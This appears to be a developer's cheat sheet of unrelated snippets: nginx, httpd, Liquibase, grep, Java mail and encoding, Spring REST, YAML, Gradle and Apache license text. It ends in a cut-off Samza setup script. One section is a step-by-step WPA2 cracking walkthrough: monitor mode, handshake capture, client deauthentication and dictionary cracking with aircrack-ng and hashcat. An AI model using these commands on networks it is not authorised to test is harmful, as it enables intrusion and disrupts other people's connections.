--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
#### NGINX
--------------------------------------------------------------------------------------------------------
service nginx stop
systemctl stop nginx

killall -9 nginx

service nginx quit
systemctl quit nginx

service nginx reload
systemctl reload nginx

nginx -t
service nginx configtest
systemctl config nginx

service nginx -V
systemctl -V nginx
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
#### HTTPD
--------------------------------------------------------------------------------------------------------
sudo service httpd start
​sudo service httpd stop
​sudo service httpd restart
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
#### Liquibase
--------------------------------------------------------------------------------------------------------
UPDATE DATABASECHANGELOGLOCK SET LOCKED=FALSE, LOCKGRANTED=null, LOCKEDBY=null where ID=1;
DELETE FROM DATABASECHANGELOGLOCK;
Drop DATABASE DATABASECHANGELOGLOCK;

<changeSet author="user" id="123">
  <preConditions onFail="CONTINUE">
    <not><sequenceExists sequenceName="SEQUENCE_NAME_SEQ" /></not>
  </preConditions>
  <createSequence sequenceName="SEQUENCE_NAME_SEQ"/>
</changeSet>

  <changeSet author="user" id="123">
  <preConditions onFail="CONTINUE">
          <sqlCheck expectedResult="0">
            select count(*) from user_sequences where sequence_name = 'SEQUENCE_NAME_SEQ';
          </sqlCheck>
  </preConditions>
  <createSequence sequenceName="SEQUENCE_NAME_SEQ"/>
</changeSet>

java -jar liquibase.jar --changeLogFile="./data/<insert file name> " --diffTypes="data" generateChangeLog

liquibase --changeLogFile=mydb.xml generateChangeLog
liquibase --changeLogFile=mydb.xml changelogSync
liquibase --changeLogFile=mydb.xml update
--------------------------------------------------------------------------------------------------------
<changeSet author="e-ballo" id="DropViewsAndcreateSynonyms" context="dev,int,uat,prod">
    <preConditions onFail="CONTINUE" >
        <viewExists viewName="PMV_PACKAGE_ITEMS" schemaName="ZON"/>
        <viewExists viewName="PMV_SUBSPLAN_INSTALLTYPES" schemaName="ZON"/>
    </preConditions>
    <dropView schemaName="ZON" viewName="PMV_PACKAGE_ITEMS"  />
    <dropView schemaName="ZON" viewName="PMV_SUBSPLAN_INSTALLTYPES"  />
    <sqlFile path="environment-synonyms.sql" relativeToChangelogFile="true" splitStatements="true" stripComments="true"/>
</changeSet>
--------------------------------------------------------------------------------------------------------
Standard Migrator Run
java -jar liquibase.jar \
      --driver=oracle.jdbc.OracleDriver \
      --classpath=\path\to\classes:jdbcdriver.jar \
      --changeLogFile=com/example/db.changelog.xml \
      --url="jdbc:oracle:thin:@localhost:1521:oracle" \
      --username=scott \
      --password=tiger \
      update
Run Migrator pulling changelogs from a .WAR file
java -jar liquibase.jar \
      --driver=oracle.jdbc.OracleDriver \
      --classpath=website.war \
      --changeLogFile=com/example/db.changelog.xml \
      --url=jdbc:oracle:thin:@localhost:1521:oracle \
      --username=scott \
      --password=tiger \
      update
Run Migrator pulling changelogs from an .EAR file
java -jar liquibase.jar \
      --driver=oracle.jdbc.OracleDriver \
      --classpath=application.ear \
      --changeLogFile=com/example/db.changelog.xml \
      --url=jdbc:oracle:thin:@localhost:1521:oracle \
      --username=scott \
      --password=tiger
Don’t execute changesets, save SQL to /tmp/script.sql
java -jar liquibase.jar \
        --driver=oracle.jdbc.OracleDriver \
        --classpath=jdbcdriver.jar \
        --url=jdbc:oracle:thin:@localhost:1521:oracle \
        --username=scott \
        --password=tiger \
        updateSQL > /tmp/script.sql
List locks on the database change log
java -jar liquibase.jar \
        --driver=oracle.jdbc.OracleDriver \
        --classpath=jdbcdriver.jar \
        --url=jdbc:oracle:thin:@localhost:1521:oracle \
        --username=scott \
        --password=tiger \
        listLocks
Add url parameters useUnicode=true and characterEncoding=UTF-8 to set character encoding to utf8.
--------------------------------------------------------------------------------------------------------
brew cask install pennywise
--------------------------------------------------------------------------------------------------------
grep -Rw '/path/to/search/' -e 'pattern'
grep --exclude=*.csv -Rw '/path/to/search' -e 'pattern'
grep --exclude-dir={dir1,dir2,*_old} -Rw '/path/to/search' -e 'pattern'
find . -name "*.php" -exec grep "pattern" {} \;
ack 'pattern'
ack 'pattern' /path/to/file.txt
--------------------------------------------------------------------------------------------------------
# put your network device into monitor mode
airmon-ng start wlan0

# listen for all nearby beacon frames to get target BSSID and channel
airodump-ng mon0

# start listening for the handshake
airodump-ng -c 6 --bssid 9C:5C:8E:C9:AB:C0 -w capture/ mon0

# optionally deauth a connected client to force a handshake
aireplay-ng -0 2 -a 9C:5C:8E:C9:AB:C0 -c 64:BC:0C:48:97:F7 mon0

########## crack password with aircrack-ng... ##########

# download 134MB rockyou.txt dictionary file if needed
curl -L -o rockyou.txt https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt

# crack w/ aircrack-ng
aircrack-ng -a2 -b 9C:5C:8E:C9:AB:C0 -w rockyou.txt capture/-01.cap

########## or crack password with naive-hashcat ##########

# convert cap to hccapx
cap2hccapx.bin capture/-01.cap capture/-01.hccapx

# crack with naive-hashcat
HASH_FILE=hackme.hccapx POT_FILE=hackme.pot HASH_TYPE=2500 ./naive-hashcat.sh

# not all clients respect broadcast deauths though
aireplay-ng -0 2 -a 9C:5C:8E:C9:AB:C0 mon0

# -0 2 specifies we would like to send 2 deauth packets. Increase this number
# if need be with the risk of noticeably interrupting client network activity
# -a is the MAC of the access point
# -c is the MAC of the client
aireplay-ng -0 2 -a 9C:5C:8E:C9:AB:C0 -c 64:BC:0C:48:97:F7 mon0

# -a2 specifies WPA2, -b is the BSSID, -w is the wordfile
aircrack-ng -a2 -b 9C:5C:8E:C9:AB:C0 -w rockyou.txt hackme.cap

# download the 134MB rockyou dictionary file
curl -L -o rockyou.txt https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt

# download
git clone https://github.com/brannondorsey/naive-hashcat
cd naive-hashcat

# download the 134MB rockyou dictionary file
curl -L -o dicts/rockyou.txt https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt

# crack ! baby ! crack !
# 2500 is the hashcat hash mode for WPA/WPA2
HASH_FILE=hackme.hccapx POT_FILE=hackme.pot HASH_TYPE=2500 ./naive-hashcat.sh

cap2hccapx.bin hackme.cap hackme.hccapx

# replace -c and --bssid values with the values of your target network
# -w specifies the directory where we will save the packet capture
airodump-ng -c 3 --bssid 9C:5C:8E:C9:AB:C0 -w . mon0

airodump-ng -c [channel] --bssid [bssid] -w /root/Desktop/ [monitor interface]
aireplay-ng –0 2 –a [router bssid] –c [client bssid] mon0
aircrack-ng -a2 -b [router bssid] -w [path to wordlist] /root/Desktop/*.cap
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
#### ROUTE
--------------------------------------------------------------------------------------------------------
route add 10.1.1.140 netmask 255.255.255.255 <defaultGW> -P
route print
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
#### MISC
--------------------------------------------------------------------------------------------------------
mvn dependency:purge-local-repository
--------------------------------------------------------------------------------------------------------
    Cp1251:
        Windows-1251 
    Cp866:
        IBM866
        IBM-866
        866
        CP866
        CSIBM866 
    KOI8_R:
        KOI8-R
        KOI8
        CSKOI8R 
    ISO8859_5:
        ISO8859-5
        ISO-8859-5
        ISO_8859-5
        ISO_8859-5:1988
        ISO-IR-144
        8859_5
        Cyrillic
        CSISOLatinCyrillic
        IBM915
        IBM-915
        Cp915
        915 
--------------------------------------------------------------------------------------------------------
CREATE DATABASE 'E:\ProjectHolding\DataBase\HOLDING.GDB' PAGE_SIZE 4096
DEFAULT CHARACTER SET UNICODE_FSS;

CREATE TABLE RUSSIAN_WORD
(
 "NAME1"  VARCHAR(40) CHARACTER SET UNICODE_FSS NOT NULL,
 "NAME2"  VARCHAR(40) CHARACTER SET WIN1251 NOT NULL,
 PRIMARY KEY ("NAME1")
);
--------------------------------------------------------------------------------------------------------
import java.util.Properties;

import javax.mail.Session;
import javax.mail.Message;
import javax.mail.Transport;
import javax.mail.internet.MimeMessage;
import javax.mail.internet.InternetAddress;

public class MailTest
{
 static final String ENCODING = "koi8-r";
 static final String FROM = "myaccount@mydomail.ru";
 static final String TO = "myaccount@mydomail.ru";

 public static void main(String args[]) throws Exception
 {
  Properties mailProps = new Properties();

  mailProps.put("mail.store.protocol","pop3");
  mailProps.put("mail.transport.protocol","smtp");
  mailProps.put("mail.user","myaccount");

  mailProps.put("mail.pop3.host","mail.mydomail.ru");
  mailProps.put("mail.smtp.host","mail.mydomail.ru");

  Session session = Session.getDefaultInstance(mailProps);

  MimeMessage message = new MimeMessage(session);
  message.setFrom(new InternetAddress(FROM));
  message.setRecipient(Message.RecipientType.TO, new InternetAddress(TO));

  message.setSubject("Тестовое письмо",ENCODING);
  message.setText("Текст тестового письма",ENCODING);

  Transport.send(message);
 }
}
--------------------------------------------------------------------------------------------------------
mode con cp select=1251
new String(mailInfo.getBody().getBytes("cp1251"), StandardCharsets.UTF_16)
javac -encoding=KOI8_R
--------------------------------------------------------------------------------------------------------
git -c diff.mnemonicprefix=false -c core.quotepath=false stash apply stash@{0}
--------------------------------------------------------------------------------------------------------
curl -i http://localhost:8080/spring-rest/ex/foos
curl -i -X POST http://localhost:8080/spring-rest/ex/foos
curl -i -H "key:val" http://localhost:8080/spring-rest/ex/foos
curl -i -d id=100 http://localhost:8080/spring-rest/ex/bars
curl -H "Accept:application/json,text/html" http://localhost:8080/spring-rest/ex/foos
curl -i -H "key1:val1" -H "key2:val2" http://localhost:8080/spring-rest/ex/foos

@RequestMapping(value = "/ex/foos", headers = "key=val", method = GET)
@ResponseBody
public String getFoosWithHeader() {
    return "Get some Foos with Header";
}

@RequestMapping(
  value = "/ex/foos", 
  method = GET, 
  headers = "Accept=application/json")
@ResponseBody
public String getFoosAsJsonFromBrowser() {
    return "Get some Foos with Header Old";
}

@RequestMapping(
  value = "/ex/foos", 
  method = GET,
  produces = { "application/json", "application/xml" }
)

@RequestMapping(value = "/ex/bars/{numericId:[\\d]+}", method = GET)
@ResponseBody
public String getBarsBySimplePathWithPathVariable(
  @PathVariable long numericId) {
    return "Get a specific Bar with id=" + numericId;
}

@RequestMapping(value = "/ex/bars", method = GET)
@ResponseBody
public String getBarBySimplePathWithRequestParam(
  @RequestParam("id") long id) {
    return "Get a specific Bar with id=" + id;
}

@RequestMapping(
  value = "/ex/bars", 
  params = { "id", "second" }, 
  method = GET)
@ResponseBody
public String getBarBySimplePathWithExplicitRequestParams(
  @RequestParam("id") long id) {
    return "Narrow Get a specific Bar with id=" + id;
}

@RequestMapping(
  value = { "/ex/advanced/bars", "/ex/advanced/foos" }, 
  method = GET)
@ResponseBody
public String getFoosOrBarsByPath() {
    return "Advanced - Get some Foos or Bars";
}

@RequestMapping(
  value = "/ex/foos/multiple", 
  method = { RequestMethod.PUT, RequestMethod.POST }
)
@ResponseBody
public String putAndPostFoos() {
    return "Advanced - PUT and POST within single method";
}

@RequestMapping(value = "*", method = RequestMethod.GET)
@ResponseBody
public String getFallback() {
    return "Fallback for GET Requests";
}

@RequestMapping(
  value = "*", 
  method = { RequestMethod.GET, RequestMethod.POST ... })
@ResponseBody
public String allFallback() {
    return "Fallback for All Requests";
}

@GetMapping(value = "foos/duplicate", produces = MediaType.APPLICATION_XML_VALUE)
public String duplicate() {
    return "Duplicate";
}
 
@GetMapping(value = "foos/duplicate", produces = MediaType.APPLICATION_JSON_VALUE)
public String duplicateEx() {
    return "Duplicate";
}
--------------------------------------------------------------------------------------------------------
gradle install -Dmaven.repo.local=the/path/of/the/folder
--------------------------------------------------------------------------------------------------------

                                 Apache License
                           Version 2.0, January 2004
                        http://www.apache.org/licenses/

   TERMS AND CONDITIONS FOR USE, REPRODUCTION, AND DISTRIBUTION

   1. Definitions.

      "License" shall mean the terms and conditions for use, reproduction,
      and distribution as defined by Sections 1 through 9 of this document.

      "Licensor" shall mean the copyright owner or entity authorized by
      the copyright owner that is granting the License.

      "Legal Entity" shall mean the union of the acting entity and all
      other entities that control, are controlled by, or are under common
      control with that entity. For the purposes of this definition,
      "control" means (i) the power, direct or indirect, to cause the
      direction or management of such entity, whether by contract or
      otherwise, or (ii) ownership of fifty percent (50%) or more of the
      outstanding shares, or (iii) beneficial ownership of such entity.

      "You" (or "Your") shall mean an individual or Legal Entity
      exercising permissions granted by this License.

      "Source" form shall mean the preferred form for making modifications,
      including but not limited to software source code, documentation
      source, and configuration files.

      "Object" form shall mean any form resulting from mechanical
      transformation or translation of a Source form, including but
      not limited to compiled object code, generated documentation,
      and conversions to other media types.

      "Work" shall mean the work of authorship, whether in Source or
      Object form, made available under the License, as indicated by a
      copyright notice that is included in or attached to the work
      (an example is provided in the Appendix below).

      "Derivative Works" shall mean any work, whether in Source or Object
      form, that is based on (or derived from) the Work and for which the
      editorial revisions, annotations, elaborations, or other modifications
      represent, as a whole, an original work of authorship. For the purposes
      of this License, Derivative Works shall not include works that remain
      separable from, or merely link (or bind by name) to the interfaces of,
      the Work and Derivative Works thereof.

      "Contribution" shall mean any work of authorship, including
      the original version of the Work and any modifications or additions
      to that Work or Derivative Works thereof, that is intentionally
      submitted to Licensor for inclusion in the Work by the copyright owner
      or by an individual or Legal Entity authorized to submit on behalf of
      the copyright owner. For the purposes of this definition, "submitted"
      means any form of electronic, verbal, or written communication sent
      to the Licensor or its representatives, including but not limited to
      communication on electronic mailing lists, source code control systems,
      and issue tracking systems that are managed by, or on behalf of, the
      Licensor for the purpose of discussing and improving the Work, but
      excluding communication that is conspicuously marked or otherwise
      designated in writing by the copyright owner as "Not a Contribution."

      "Contributor" shall mean Licensor and any individual or Legal Entity
      on behalf of whom a Contribution has been received by Licensor and
      subsequently incorporated within the Work.

   2. Grant of Copyright License. Subject to the terms and conditions of
      this License, each Contributor hereby grants to You a perpetual,
      worldwide, non-exclusive, no-charge, royalty-free, irrevocable
      copyright license to reproduce, prepare Derivative Works of,
      publicly display, publicly perform, sublicense, and distribute the
      Work and such Derivative Works in Source or Object form.

   3. Grant of Patent License. Subject to the terms and conditions of
      this License, each Contributor hereby grants to You a perpetual,
      worldwide, non-exclusive, no-charge, royalty-free, irrevocable
      (except as stated in this section) patent license to make, have made,
      use, offer to sell, sell, import, and otherwise transfer the Work,
      where such license applies only to those patent claims licensable
      by such Contributor that are necessarily infringed by their
      Contribution(s) alone or by combination of their Contribution(s)
      with the Work to which such Contribution(s) was submitted. If You
      institute patent litigation against any entity (including a
      cross-claim or counterclaim in a lawsuit) alleging that the Work
      or a Contribution incorporated within the Work constitutes direct
      or contributory patent infringement, then any patent licenses
      granted to You under this License for that Work shall terminate
      as of the date such litigation is filed.

   4. Redistribution. You may reproduce and distribute copies of the
      Work or Derivative Works thereof in any medium, with or without
      modifications, and in Source or Object form, provided that You
      meet the following conditions:

      (a) You must give any other recipients of the Work or
          Derivative Works a copy of this License; and

      (b) You must cause any modified files to carry prominent notices
          stating that You changed the files; and

      (c) You must retain, in the Source form of any Derivative Works
          that You distribute, all copyright, patent, trademark, and
          attribution notices from the Source form of the Work,
          excluding those notices that do not pertain to any part of
          the Derivative Works; and

      (d) If the Work includes a "NOTICE" text file as part of its
          distribution, then any Derivative Works that You distribute must
          include a readable copy of the attribution notices contained
          within such NOTICE file, excluding those notices that do not
          pertain to any part of the Derivative Works, in at least one
          of the following places: within a NOTICE text file distributed
          as part of the Derivative Works; within the Source form or
          documentation, if provided along with the Derivative Works; or,
          within a display generated by the Derivative Works, if and
          wherever such third-party notices normally appear. The contents
          of the NOTICE file are for informational purposes only and
          do not modify the License. You may add Your own attribution
          notices within Derivative Works that You distribute, alongside
          or as an addendum to the NOTICE text from the Work, provided
          that such additional attribution notices cannot be construed
          as modifying the License.

      You may add Your own copyright statement to Your modifications and
      may provide additional or different license terms and conditions
      for use, reproduction, or distribution of Your modifications, or
      for any such Derivative Works as a whole, provided Your use,
      reproduction, and distribution of the Work otherwise complies with
      the conditions stated in this License.

   5. Submission of Contributions. Unless You explicitly state otherwise,
      any Contribution intentionally submitted for inclusion in the Work
      by You to the Licensor shall be under the terms and conditions of
      this License, without any additional terms or conditions.
      Notwithstanding the above, nothing herein shall supersede or modify
      the terms of any separate license agreement you may have executed
      with Licensor regarding such Contributions.

   6. Trademarks. This License does not grant permission to use the trade
      names, trademarks, service marks, or product names of the Licensor,
      except as required for reasonable and customary use in describing the
      origin of the Work and reproducing the content of the NOTICE file.

   7. Disclaimer of Warranty. Unless required by applicable law or
      agreed to in writing, Licensor provides the Work (and each
      Contributor provides its Contributions) on an "AS IS" BASIS,
      WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or
      implied, including, without limitation, any warranties or conditions
      of TITLE, NON-INFRINGEMENT, MERCHANTABILITY, or FITNESS FOR A
      PARTICULAR PURPOSE. You are solely responsible for determining the
      appropriateness of using or redistributing the Work and assume any
      risks associated with Your exercise of permissions under this License.

   8. Limitation of Liability. In no event and under no legal theory,
      whether in tort (including negligence), contract, or otherwise,
      unless required by applicable law (such as deliberate and grossly
      negligent acts) or agreed to in writing, shall any Contributor be
      liable to You for damages, including any direct, indirect, special,
      incidental, or consequential damages of any character arising as a
      result of this License or out of the use or inability to use the
      Work (including but not limited to damages for loss of goodwill,
      work stoppage, computer failure or malfunction, or any and all
      other commercial damages or losses), even if such Contributor
      has been advised of the possibility of such damages.

   9. Accepting Warranty or Additional Liability. While redistributing
      the Work or Derivative Works thereof, You may choose to offer,
      and charge a fee for, acceptance of support, warranty, indemnity,
      or other liability obligations and/or rights consistent with this
      License. However, in accepting such obligations, You may act only
      on Your own behalf and on Your sole responsibility, not on behalf
      of any other Contributor, and only if You agree to indemnify,
      defend, and hold each Contributor harmless for any liability
      incurred by, or claims asserted against, such Contributor by reason
      of your accepting any such warranty or additional liability.

   END OF TERMS AND CONDITIONS

   APPENDIX: How to apply the Apache License to your work.

      To apply the Apache License to your work, attach the following
      boilerplate notice, with the fields enclosed by brackets "[]"
      replaced with your own identifying information. (Don't include
      the brackets!)  The text should be enclosed in the appropriate
      comment syntax for the file format. We also recommend that a
      file or class name and description of purpose be included on the
      same "printed page" as the copyright notice for easier
      identification within third-party archives.

   Copyright [yyyy] [name of copyright owner]

   Licensed under the Apache License, Version 2.0 (the "License");
   you may not use this file except in compliance with the License.
   You may obtain a copy of the License at

       http://www.apache.org/licenses/LICENSE-2.0

   Unless required by applicable law or agreed to in writing, software
   distributed under the License is distributed on an "AS IS" BASIS,
   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
   See the License for the specific language governing permissions and
   limitations under the License.
--------------------------------------------------------------------------------------------------------


---

- &CENTER { x: 1, y: 2 }

- &LEFT { x: 0, y: 2 }

- &BIG { r: 10 }

- &SMALL { r: 1 }

 

# All the following maps are equal:

 

- # Explicit keys

  x: 1

  y: 2

  r: 10

  label: center/big

 

- # Merge one map

  << : *CENTER

  r: 10

  label: center/big

 

- # Merge multiple maps

  << : [ *CENTER, *BIG ]

  label: center/big

 

- # Override

  << : [ *BIG, *LEFT, *SMALL ]

  x: 1

  label: center/big
--------------------------------------------------------------------------------------------------------
default: &DEFAULT

  URL:          stooges.com

  throw_pies?:  true 

  stooges:  &stooge_list

    larry:  first_stooge

    moe:    second_stooge

    curly:  third_stooge

 

development:

  <<: *DEFAULT

  URL:      stooges.local

  stooges:

    shemp: fourth_stooge

 

test:

  <<: *DEFAULT

  URL:    test.stooges.qa

  stooges:

    <<: *stooge_list

    shemp: fourth_stooge
--------------------------------------------------------------------------------------------------------
mvn <goals> -rf :diffy-processor
--------------------------------------------------------------------------------------------------------
-Djavax.net.debug=ssl,handshake -Djavax.net.ssl.keyStoreType=PKCS12 -Djavax.net.ssl.keyStore=our-client-certs -Djavax.net.ssl.trustStoreType=jks -Djavax.net.ssl.trustStore=their-server-certs
keytool -keystore ..\lib\security\cacerts -import -alias your.ssl.server.name -file .\relative-path-to-cert-file\your.ssl.server.name.crt

java -Djavax.net.ssl.trustStore="C:/Program Files/Java/jdk1.8.0_66/jre/lib/security/cacerts" -jar jenkins.war 
java -Djavax.net.ssl.trustStore -jar jenkins.war
--------------------------------------------------------------------------------------------------------
#!/bin/sh
cd $(dirname $0)

cd ../complete

mvn clean package
ret=$?
if [ $ret -ne 0 ]; then
exit $ret
fi
rm -rf target

./gradlew build
ret=$?
if [ $ret -ne 0 ]; then
exit $ret
fi
rm -rf build

cd ../initial

mvn clean compile
ret=$?
if [ $ret -ne 0 ]; then
exit $ret
fi
rm -rf target

./gradlew compileJava
ret=$?
if [ $ret -ne 0 ]; then
exit $ret
fi
rm -rf build

exit
--------------------------------------------------------------------------------------------------------
@if "%DEBUG%" == "" @echo off
@rem ##########################################################################
@rem
@rem  Gradle startup script for Windows
@rem
@rem ##########################################################################

@rem Set local scope for the variables with windows NT shell
if "%OS%"=="Windows_NT" setlocal

set DIRNAME=%~dp0
if "%DIRNAME%" == "" set DIRNAME=.
set APP_BASE_NAME=%~n0
set APP_HOME=%DIRNAME%

@rem Add default JVM options here. You can also use JAVA_OPTS and GRADLE_OPTS to pass JVM options to this script.
set DEFAULT_JVM_OPTS=

@rem Find java.exe
if defined JAVA_HOME goto findJavaFromJavaHome

set JAVA_EXE=java.exe
%JAVA_EXE% -version >NUL 2>&1
if "%ERRORLEVEL%" == "0" goto init

echo.
echo ERROR: JAVA_HOME is not set and no 'java' command could be found in your PATH.
echo.
echo Please set the JAVA_HOME variable in your environment to match the
echo location of your Java installation.

goto fail

:findJavaFromJavaHome
set JAVA_HOME=%JAVA_HOME:"=%
set JAVA_EXE=%JAVA_HOME%/bin/java.exe

if exist "%JAVA_EXE%" goto init

echo.
echo ERROR: JAVA_HOME is set to an invalid directory: %JAVA_HOME%
echo.
echo Please set the JAVA_HOME variable in your environment to match the
echo location of your Java installation.

goto fail

:init
@rem Get command-line arguments, handling Windows variants

if not "%OS%" == "Windows_NT" goto win9xME_args
if "%@eval[2+2]" == "4" goto 4NT_args

:win9xME_args
@rem Slurp the command line arguments.
set CMD_LINE_ARGS=
set _SKIP=2

:win9xME_args_slurp
if "x%~1" == "x" goto execute

set CMD_LINE_ARGS=%*
goto execute

:4NT_args
@rem Get arguments from the 4NT Shell from JP Software
set CMD_LINE_ARGS=%$

:execute
@rem Setup the command line

set CLASSPATH=%APP_HOME%\gradle\wrapper\gradle-wrapper.jar

@rem Execute Gradle
"%JAVA_EXE%" %DEFAULT_JVM_OPTS% %JAVA_OPTS% %GRADLE_OPTS% "-Dorg.gradle.appname=%APP_BASE_NAME%" -classpath "%CLASSPATH%" org.gradle.wrapper.GradleWrapperMain %CMD_LINE_ARGS%

:end
@rem End local scope for the variables with windows NT shell
if "%ERRORLEVEL%"=="0" goto mainEnd

:fail
rem Set variable GRADLE_EXIT_CONSOLE if you need the _script_ return code instead of
rem the _cmd.exe /c_ return code!
if  not "" == "%GRADLE_EXIT_CONSOLE%" exit 1
exit /b 1

:mainEnd
if "%OS%"=="Windows_NT" endlocal

:omega
--------------------------------------------------------------------------------------------------------
import static org.assertj.core.api.Assertions.assertThat;

import org.junit.Test;
import org.junit.runner.RunWith;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.boot.test.context.SpringBootTest;
import org.springframework.test.context.junit4.SpringRunner;
import org.springframework.web.client.RestTemplate;

@RunWith(SpringRunner.class)
//@DataJpaTest
@SpringBootTest(webEnvironment = WebEnvironment.RANDOM_PORT, classes = { com.ubs.api.rest.jenkins.loader.AppLoader })
public class BaseTest {

	@After
	public void init(){
	}

	@Before
	public void destroy(){
	}
	
	@Autowired
	private RestTemplate restTemplate;

	@Test
	public void contextLoads() {
		assertThat(restTemplate).isNotNull();
	}
}
--------------------------------------------------------------------------------------------------------
imports:
    ansible: ansible
    ansible_playbooks: oss-playbooks

curl module ansible:
    # Equivalent of git cloning tags/v1.6.6 but much, much faster
    url: https://codeload.github.com/ansible/ansible/zip/69d85c22c7475ccf8169b6ec9dee3ee28c92a314
    unpack: zip
    export: ansible-69d85c22c7475ccf8169b6ec9dee3ee28c92a314

git module ansible_playbooks:
    url: https://github.com/snowplow/ansible-playbooks.git
    # Comment out to fetch a specific rev instead of master:
    # rev: xxx
--------------------------------------------------------------------------------------------------------
#!/bin/bash -e
# Licensed to the Apache Software Foundation (ASF) under one
# or more contributor license agreements.  See the NOTICE file
# distributed with this work for additional information
# regarding copyright ownership.  The ASF licenses this file
# to you under the Apache License, Version 2.0 (the
# "License"); you may not use this file except in compliance
# with the License.  You may obtain a copy of the License at
#
#   http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing,
# software distributed under the License is distributed on an
# "AS IS" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY
# KIND, either express or implied.  See the License for the
# specific language governing permissions and limitations
# under the License.

# This script will download, setup, start, and stop servers for Kafka, YARN, and ZooKeeper,
# as well as downloading, building and locally publishing Samza

export JAVA_HOME="$(dirname $(dirname $(readlink -f `which javac`)))"

DIR="$( cd "$( dirname "${BASH_SOURCE[0]}" )" && pwd )"
BASE_DIR=$(dirname $DIR)
DEPLOY_ROOT_DIR=$BASE_DIR/vagrant/grid-deploy
DOWNLOAD_CACHE_DIR=$HOME/.samza/download
COMMAND=$1
SYSTEM=$2

DOWNLOAD_KAFKA=http://www.us.apache.org/dist/kafka/0.8.2.1/kafka_2.10-0.8.2.1.tgz
DOWNLOAD_YARN=https://archive.apache.org/dist/hadoop/common/hadoop-2.4.0/hadoop-2.4.0.tar.gz
DOWNLOAD_ZOOKEEPER=http://archive.apache.org/dist/zookeeper/zookeeper-3.4.3/zookeeper-3.4.3.tar.gz

bootstrap() {
  echo "Bootstrapping the system..."
  stop_all
  rm -rf "$DEPLOY_ROOT_DIR"
  mkdir "$DEPLOY_ROOT_DIR"
  install_all
  start_all
  exit 0
}

install_all() {
  $DIR/grid install zookeeper
  $DIR/grid install yarn
  $DIR/grid install kafka
}

install_zookeeper() {
  mkdir -p "$DEPLOY_ROOT_DIR"
